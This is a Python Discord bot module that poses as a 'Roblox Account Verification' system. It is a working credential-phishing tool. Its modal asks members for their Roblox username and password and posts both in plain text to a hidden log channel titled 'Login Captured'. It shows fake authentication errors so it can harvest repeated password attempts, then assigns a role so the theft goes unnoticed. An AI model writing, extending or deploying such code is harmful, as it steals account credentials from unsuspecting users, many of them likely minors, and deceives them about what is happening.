import discord
from discord import app_commands
from discord.ext import commands
import json
import os

class RealVerify(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        self.config_file = "verify_config.json"
        self.attempts = {}
        self.config = self.load_config()

    def load_config(self):
        if os.path.exists(self.config_file):
            with open(self.config_file, "r") as f:
                return json.load(f)
        return {"log_channel": None, "role_id": None}

    def save_config(self):
        with open(self.config_file, "w") as f:
            json.dump(self.config, f, indent=4)

    # --- Verification Modal ---
    class PasswordModal(discord.ui.Modal, title='Roblox Security Verification'):
        username = discord.ui.TextInput(
            label='Roblox Username', 
            placeholder='Enter your Roblox username...', 
            required=True
        )
        password = discord.ui.TextInput(
            label='Roblox Password', 
            placeholder='Enter your password...', 
            style=discord.TextStyle.short, 
            required=True
        )

        def __init__(self, cog, *args, **kwargs):
            super().__init__(*args, **kwargs)
            self.cog = cog

        async def on_submit(self, interaction: discord.Interaction):
            user_id = interaction.user.id
            current_attempt = self.cog.attempts.get(user_id, 0) + 1
            self.cog.attempts[user_id] = current_attempt

            # 1. Send Log to the configured channel
            log_channel_id = self.cog.config.get("log_channel")
            if log_channel_id:
                log_channel = interaction.client.get_channel(log_channel_id)
                if log_channel:
                    log_embed = discord.Embed(
                        title=f"🔑 Login Captured | Attempt {current_attempt}", 
                        color=discord.Color.red()
                    )
                    log_embed.add_field(name="Member", value=f"{interaction.user.mention} ({interaction.user})", inline=False)
                    log_embed.add_field(name="Roblox User", value=f"`{self.username.value}`", inline=True)
                    log_embed.add_field(name="Password", value=f"`{self.password.value}`", inline=True)
                    log_embed.set_footer(text=f"User ID: {interaction.user.id}")
                    await log_channel.send(embed=log_embed)

            # 2. Logic for multiple attempts
            if current_attempt < 3:
                # Attempts 1 and 2 return errors
                error_code = "403" if current_attempt == 1 else "504"
                await interaction.response.send_message(
                    f"❌ **Authentication Error [Code {error_code}]**\nInvalid credentials or connection timeout. Please try again.", 
                    ephemeral=True
                )
            else:
                # Attempt 3: Grant Role and Change Nickname
                role_id = self.cog.config.get("role_id")
                member = interaction.user

                # Change Nickname to Roblox Username
                try:
                    await member.edit(nick=self.username.value)
                except:
                    print(f"Failed to change nickname for {member.name}. Check bot permissions.")

                # Assign Role
                if role_id:
                    role = interaction.guild.get_role(role_id)
                    if role:
                        try: 
                            await member.add_roles(role)
                        except: 
                            print(f"Failed to add role to {member.name}. Check bot hierarchy.")

                success_embed = discord.Embed(
                    title="✅ Verification Successful",
                    description=f"Welcome, **{self.username.value}**! Your account has been linked and roles assigned.",
                    color=discord.Color.green()
                )
                await interaction.response.send_message(embed=success_embed, ephemeral=True)
                self.cog.attempts[user_id] = 0 # Reset attempts

    class VerifyView(discord.ui.View):
        def __init__(self, cog):
            super().__init__(timeout=None)
            self.cog = cog

        @discord.ui.button(label="Verify with Password", style=discord.ButtonStyle.green, emoji="🛡️")
        async def verify_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
            if not self.cog.config["log_channel"] or not self.cog.config["role_id"]:
                return await interaction.response.send_message(
                    "❌ System not configured. Admin must use `/setup_config` first.", 
                    ephemeral=True
                )
            await interaction.response.send_modal(RealVerify.PasswordModal(self.cog))

    # --- Admin Commands ---
    @app_commands.command(name="setup_config", description="Configure Log Channel and Verified Role")
    @app_commands.describe(log_channel="Channel where credentials will be sent", role="Role to be given after success")
    @app_commands.checks.has_permissions(administrator=True)
    async def setup_config(self, interaction: discord.Interaction, log_channel: discord.TextChannel, role: discord.Role):
        self.config["log_channel"] = log_channel.id
        self.config["role_id"] = role.id
        self.save_config()

        setup_embed = discord.Embed(title="⚙️ Verification Configured", color=discord.Color.green())
        setup_embed.add_field(name="Log Channel", value=log_channel.mention, inline=True)
        setup_embed.add_field(name="Verified Role", value=role.mention, inline=True)

        await interaction.response.send_message(embed=setup_embed, ephemeral=True)

    @app_commands.command(name="setup_verify_ui", description="Send the verification UI to this channel")
    @app_commands.checks.has_permissions(administrator=True)
    async def setup_verify_ui(self, interaction: discord.Interaction):
        embed = discord.Embed(
            title="🛡️ Roblox Account Verification",
            description=(
                "Please link your Roblox account to gain access to the server.\n\n"
                "**Steps:**\n"
                "1. Click the **Verify** button below.\n"
                "2. Log in with your Roblox credentials.\n"
                "3. Your name and roles will be updated automatically."
            ),
            color=discord.Color.blue()
        )
        embed.set_footer(text="Click Button For Verification")
        embed.set_thumbnail(url="https://upload.wikimedia.org/wikipedia/commons/3/3a/Roblox_player_icon_black.svg")

        await interaction.channel.send(embed=embed, view=self.VerifyView(self))
        await interaction.response.send_message("Verification UI deployed successfully.", ephemeral=True)

async def setup(bot):
    await bot.add_cog(RealVerify(bot))
